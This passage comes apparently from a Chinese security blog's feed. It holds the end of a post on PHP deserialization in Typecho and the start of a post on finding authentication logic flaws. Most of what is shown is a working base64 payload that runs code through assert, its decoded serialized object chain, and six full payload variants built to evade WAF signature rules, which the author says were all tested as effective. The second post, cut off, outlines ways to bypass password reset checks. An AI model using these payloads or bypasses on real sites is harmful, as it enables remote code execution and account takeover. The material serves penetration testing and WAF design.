class="hljs-operator">=</span>YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUxMTc5NTIwMTtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>使用上文payload可以执行phpinfo()函数，将payload进行base64解码之后可得以下内容：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h3 id="绕过WAF的方式："><a href="#绕过WAF的方式：" class="headerlink" title="绕过WAF的方式："></a>绕过WAF的方式：</h3><p>针对此漏洞，WAF的防御思路应该是根据payload进行base64解码之后的内容做静态内容匹配和正则匹配，比如规则会识别数据包中是否存在Typecho_Request、screenName等字段，但是为了提高识别的精准度和防止误报，应该会加上一些其他的payload特征来达到防御效果，因此下文从攻击者角度介绍几种绕过此类漏洞规则的方法。</p><ul><li><h4 id="序列化字符串之后添加任意内容"><a href="#序列化字符串之后添加任意内容" class="headerlink" title="序列化字符串之后添加任意内容"></a>序列化字符串之后添加任意内容</h4></li></ul><p>序列化字符串之后添加任意字符串不影响序列化结果，如一下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;test_sangfor<br></code></pre></td></tr></table></figure><ul><li><h4 id="在表示长度的数字前添加一个或者多个0"><a href="#在表示长度的数字前添加一个或者多个0" class="headerlink" title="在表示长度的数字前添加一个或者多个0"></a>在表示长度的数字前添加一个或者多个0</h4></li></ul><p>可以在数字前如表示字符串长度的数字之前添加多个0，不影响反序列化结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">0000000007</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li><h4 id="字符串进行HEX编码"><a href="#字符串进行HEX编码" class="headerlink" title="字符串进行HEX编码"></a>字符串进行HEX编码</h4></li></ul><p>上文中提到了s标志与S的区别，即s是表示字符串ASCII字符，S表示字符串HEX编码的值，因此将s转换为hex可以达到一个比较良好的绕过效果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;S:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;\70\68\70\69\6e\66\6f\28\29&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li><h4 id="使用任意字符串代替s之后的分号："><a href="#使用任意字符串代替s之后的分号：" class="headerlink" title="使用任意字符串代替s之后的分号："></a>使用任意字符串代替s之后的分号：</h4></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>AO:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li><h4 id="在数字之前添加一个"><a href="#在数字之前添加一个" class="headerlink" title="在数字之前添加一个+"></a>在数字之前添加一个+</h4></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:+<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li><h4 id="使用任意字符替换O之后的"><a href="#使用任意字符替换O之后的" class="headerlink" title="使用任意字符替换O之后的:{"></a>使用任意字符替换O之后的:{</h4></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>AAs:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>以上绕过方式经测试均为有效绕过</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-PHP反序列化漏洞成因&quot;&gt;&lt;a href=&quot;#0x01-PHP反序列化漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;0x01 PHP反序列化漏洞成因&quot;&gt;&lt;/a&gt;0x01 PHP反序列化漏洞成因&lt;/h2&gt;&lt;h3 id=&quot;序列化与反序列化&quot;&gt;&lt;a href=&quot;#序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化&quot;&gt;&lt;/a&gt;序列化与反序列化&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 –php官方文档&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;serialize() ：返回带有变量类型和值的字符串&lt;/p&gt;
&lt;p&gt;unserialize() ：想要将已序列化的字符串变回 PHP 的值&lt;/p&gt;</summary>
    
    
    
    <category term="WEB安全" scheme="https://www.hvnt3r.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="PHP反序列化" scheme="https://www.hvnt3r.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="漏洞挖掘" scheme="https://www.hvnt3r.top/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>身份认证逻辑缺陷漏洞挖掘思路</title>
    <link href="https://www.hvnt3r.top/2020/12/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/"/>
    <id>https://www.hvnt3r.top/2020/12/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</id>
    <published>2020-12-30T15:05:46.000Z</published>
    <updated>2022-02-16T12:06:42.871Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在渗透测试项目中，很多时候横在我们渗透路上的第一个拦路虎就是后台登录界面，有时可以通过找弱密码的方式直接获取登录后的权限，有时也可以通过钓鱼或者在其他业务系统中拿到的账户密码来登录目标系统获取更多权限，有时也可以通过未授权访问漏洞来获取本应登录后才能拿到的数据，但是如果没有以上渠道，想要获取一个靶标系统的访问权限就比较难了，因此下文总结身份认证逻辑缺陷相关漏洞挖掘思路。</p><span id="more"></span><h3 id="密码重置逻辑漏洞"><a href="#密码重置逻辑漏洞" class="headerlink" title="密码重置逻辑漏洞"></a>密码重置逻辑漏洞</h3><h4 id="1、任意验证码重置密码"><a href="#1、任意验证码重置密码" class="headerlink" title="1、任意验证码重置密码"></a>1、任意验证码重置密码</h4><ul><li>无验证码验证</li></ul><p>这种漏洞多出现于边缘业务系统（Bug较多，开发人员编码能力差），或者是新上线的系统（逻辑不完善），修改密码时可以不需要验证码或输入任意验证码，真实场景应该比较少见。</p><ul><li>验证码校验逻辑写在前端代码中</li></ul><p>有的业务系统可能将验证码验证的逻辑写在js中，这时找到返回的验证码信息，可能进行加加密，按照代码逻辑还原出原始验证码再输入对应验证码或者通过浏览器调试功能跳过验证逻辑即可。</p><h4 id="2、验证码验证逻辑错误"><a href="#2、验证码验证逻辑错误" class="headerlink" 